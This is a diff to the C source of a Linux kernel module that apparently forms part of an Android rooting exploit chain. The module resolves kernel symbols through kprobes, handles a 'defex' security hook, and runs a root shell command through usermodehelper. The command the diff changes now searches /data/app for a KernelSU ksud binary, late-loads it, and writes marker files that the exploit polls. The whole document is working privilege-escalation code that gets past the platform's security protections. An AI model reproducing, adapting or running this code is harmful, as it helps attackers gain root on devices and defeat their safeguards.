@@ -42,25 +42,33 @@ static int __nocfi __init dirtyfrag_init(void)
     void *info;
     int ret;
 
-    static const char sh[]   = "/system/bin/sh";
-    static const char ksud[] = "/data/user_de/0/df.root/ksud";
-    static char cmd[512];
+    static const char sh[] = "/system/bin/sh";
+    static char cmd[768];
     static char *envp[] = { "PATH=/system/bin", NULL };
     static char *argv[] = { (char *)sh, "-c", cmd, NULL };
 
-    /* Skip the load when kernelsu is already there. Report through the markers
-     * the exploit polls for, so an already-loaded module still reads as success. */
+    /* Resolve ksud at runtime. The staged path is per-app, so fall back to the
+     * manager's own libksud.so under /data/app, keyed off the package name the
+     * exploit passes through insmod. Skip the load when kernelsu is already
+     * there. Report through the markers the exploit polls for, so an
+     * already-loaded module still reads as success. */
     if (soft_reboot)
         snprintf(cmd, sizeof(cmd),
                  "if grep -q '^kernelsu ' /proc/modules; then touch /dev/dfm0; exit 0; fi; "
-                 "%s late-load --package-name %s || { touch /dev/dfm1; exit 1; }; "
-                 "touch /dev/dfm0; %s soft-reboot",
-                 ksud, package_name, ksud);
+                 "KSUD=/data/user_de/0/df.root/ksud; "
+                 "[ -x \"$KSUD\" ] || KSUD=$(find /data/app -path '*/%s*/lib/arm64/libksud.so' 2>/dev/null | head -1); "
+                 "[ -n \"$KSUD\" ] || KSUD=/data/adb/ksu/bin/ksud; "
+                 "\"$KSUD\" late-load --package-name %s || { touch /dev/dfm1; exit 1; }; "
+                 "touch /dev/dfm0; \"$KSUD\" soft-reboot",
+                 package_name, package_name);
     else
         snprintf(cmd, sizeof(cmd),
                  "if grep -q '^kernelsu ' /proc/modules; then touch /dev/dfm0; exit 0; fi; "
-                 "%s late-load --package-name %s && touch /dev/dfm0 || touch /dev/dfm1",
-                 ksud, package_name);
+                 "KSUD=/data/user_de/0/df.root/ksud; "
+                 "[ -x \"$KSUD\" ] || KSUD=$(find /data/app -path '*/%s*/lib/arm64/libksud.so' 2>/dev/null | head -1); "
+                 "[ -n \"$KSUD\" ] || KSUD=/data/adb/ksu/bin/ksud; "
+                 "\"$KSUD\" late-load --package-name %s && touch /dev/dfm0 || touch /dev/dfm1",
+                 package_name, package_name);
 
     kln_kp = (struct kprobe){ .symbol_name = "kallsyms_lookup_name" };
     if (register_kprobe(&kln_kp) < 0) {
@@ -109,7 +117,7 @@ static int __nocfi __init dirtyfrag_init(void)
     ((struct subprocess_info *)info)->path = sh;
 
     ret = umh_exec(info, UMH_WAIT_PROC);
-    pr_info("dfroot: usermodehelper_exec(%s) returned %d\n", ksud, ret);
+    pr_info("dfroot: usermodehelper_exec returned %d\n", ret);
 
     if (defex_kp.addr) unregister_kprobe(&defex_kp);
     if (umh_kp.addr)   unregister_kprobe(&umh_kp);
